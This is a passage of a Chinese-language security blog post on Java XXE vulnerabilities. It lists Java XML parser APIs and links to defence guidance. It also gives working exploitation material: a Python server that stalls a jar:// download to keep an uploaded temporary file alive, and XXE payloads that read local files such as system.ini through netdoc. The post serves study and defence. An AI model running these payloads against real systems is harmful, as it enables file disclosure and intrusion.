+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT addr (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT tel (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Java-XML-解析"><a href="#2-Java-XML-解析" class="headerlink" title="2 Java XML 解析"></a>2 Java XML 解析</h2><p>Java XML 解析 主要相关的函数</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.DocumentBuilderFactory</span>;</span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.SAXParser</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.TransformerFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.Validator</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.SchemaFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXTransformerFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXSource</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.XMLReader</span></span><br><span class="line"><span class="selector-tag">DocumentHelper</span><span class="selector-class">.parseText</span></span><br><span class="line"><span class="selector-tag">DocumentBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.helpers</span><span class="selector-class">.XMLReaderFactory</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.dom4j</span><span class="selector-class">.io</span><span class="selector-class">.SAXReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom2</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.bind</span><span class="selector-class">.Unmarshaller</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.xpath</span><span class="selector-class">.XpathExpression</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.stream</span><span class="selector-class">.XMLStreamReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.digester3</span><span class="selector-class">.Digester</span></span><br><span class="line"><span class="selector-tag">rg</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.SAXParseExceptionpublicId</span></span><br></pre></td></tr></table></figure>
+
+<p>解析实例和防御方法可以查看：</p>
+<p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-总结/</a></p>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java</a></p>
+<h2 id="3-Java-XXE-利用"><a href="#3-Java-XXE-利用" class="headerlink" title="3 Java XXE 利用"></a>3 Java XXE 利用</h2><p>各平台支持的协议如下</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824193247.png" alt="image-20200824193246228"></p>
+<ol>
+<li>其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35</li>
+<li>libxml 是 PHP 的 xml 支持</li>
+</ol>
+<p>Java中的XXE支持 <code>sun.net.www.protocol</code> 里面的所有协议：http，https，file，ftp，mailto，jar，netdoc 。一般利用file协议读取文件、利用http协议探测内网，没有回显时可利用file协议结合http协议或ftp协议来读取文件。</p>
+<p>Java XXE 的利用和 php 的查不多，总结一般的利用方式如下：</p>
+<ul>
+<li>file 协议读文件</li>
+<li>内网主机探测</li>
+<li>内网端口探测</li>
+<li>DoS拒绝服务攻击</li>
+</ul>
+<p>详细可以查看：<code>https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解 XXE 漏洞/</code></p>
+<p>区别于 PHP 的利用方式如下</p>
+<h3 id="3-1-jar-文件上传"><a href="#3-1-jar-文件上传" class="headerlink" title="3.1 jar:// 文件上传"></a>3.1 jar:// 文件上传</h3><p>jar 协议语法，<code>jar:{url}!/{entry}</code>，url是文件的路径，entry是想要解压出来的文件</p>
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<ol>
+<li>下载 jar/zip 文件到临时文件中</li>
+<li>提取出我们指定的文件</li>
+<li>删除临时文件</li>
+</ol>
+<p>那么延长服务器传递文件的时间，就可以延长临时文件存在的时间</p>
+<p>server.py，这里在传输最后一个字符的时候会 sleep 30s</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'localhost'</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'Client req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure>
+
+<p>运行服务器，让其监听</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182027.png" alt="image-20200824182026676"></p>
+<p>然后 xxe 结合 jar 协议</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"jar:http://localhost:9999/1.zip!/wm.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">convert</span>&gt;</span><span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">convert</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>1.zip</code> 中并不存在 <code>wm.php</code> 这个文件，所以可以在报错中看到临时文件的位置</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182311.png" alt="image-20200824182309774"></p>
+<p>这里实际测试并不一定只能上传 <code>zip</code> 格式的文件，但因为 jar 协议会对文件进行解包操作，如果不上传 <code>zip</code> 格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次 <code>zip</code> 格式文件获取路径然后再上传其他文件。</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182435.png" alt="image-20200824182434415"></p>
+<h3 id="3-2-netdoc-协议"><a href="#3-2-netdoc-协议" class="headerlink" title="3.2 netdoc 协议"></a>3.2 netdoc 协议</h3><p>Java 中 netdoc 协议可以替代 file 协议功能，读文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT <span class="meta-keyword">creds</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"netdoc:///c:/windows/system.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时也可以列目录：</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824191609.png" alt="image-20200824191608338"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/6829" target="_blank" rel="noopener">https://xz.aliyun.com/t/6829</a></p>
+</li>
+<li><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你深入理解 XXE 漏洞 - K0rz3n</a></p>
+</li>
+<li><p><a href="https://www.smi1e.top/dsada/" target="_blank" rel="noopener">https://www.smi1e.top/dsada/</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2020/08/24/Java_03/" title="Java XXE 漏洞">https://jlkl.github.io/2020/08/24/Java_03/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/XXE/" rel="tag"># XXE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/23/Java_02/" rel="prev" title="Java Web 基础">
+      <i class="fa fa-chevron-left"></i> Java Web 基础
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/26/PHP_01/" rel="next" title="PHP函数漏洞总结">
+      PHP函数漏洞总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-XML-基础"><span class="nav-number">1.</span> <span class="nav-text">1 XML 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-XML文档结构"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 XML文档结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-DTD"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-实体分类"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 实体分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-1-内置实体-Built-in-entities"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.3.1 内置实体 (Built-in entities)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-2-字符实体-Character-entities"><span class="nav-number">1.3.2.</span> <span class="nav-text">1.3.2 字符实体 (Character entities)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-3-普通实体-General-entities"><span class="nav-number">1.3.3.</span> <span class="nav-text">1.3.3 普通实体 (General entities)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-4-参数实体-Parameter-entities"><span class="nav-number">1.3.4.</span> <span class="nav-text">1.3.4 参数实体 (Parameter entities)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-内部实体和外部实体"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 内部实体和外部实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-通用实体和参数实体"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 通用实体和参数实体</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-1-内部通用实体"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.5.1 内部通用实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-2-外部通用实体"><span class="nav-number">1.5.2.</span> <span class="nav-text">1.5.2 外部通用实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-3-内部参数实体"><span class="nav-number">1.5.3.</span> <span class="nav-text">1.5.3 内部参数实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-4-外部参数实体"><span class="nav-number">1.5.4.</span> <span class="nav-text">1.5.4 外部参数实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Java-XML-解析"><span class="nav-number">2.</span> <span class="nav-text">2 Java XML 解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Java-XXE-利用"><span class="nav-number">3.</span> <span class="nav-text">3 Java XXE 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-jar-文件上传"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 jar:&#x2F;&#x2F; 文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-netdoc-协议"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 netdoc 协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">218k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
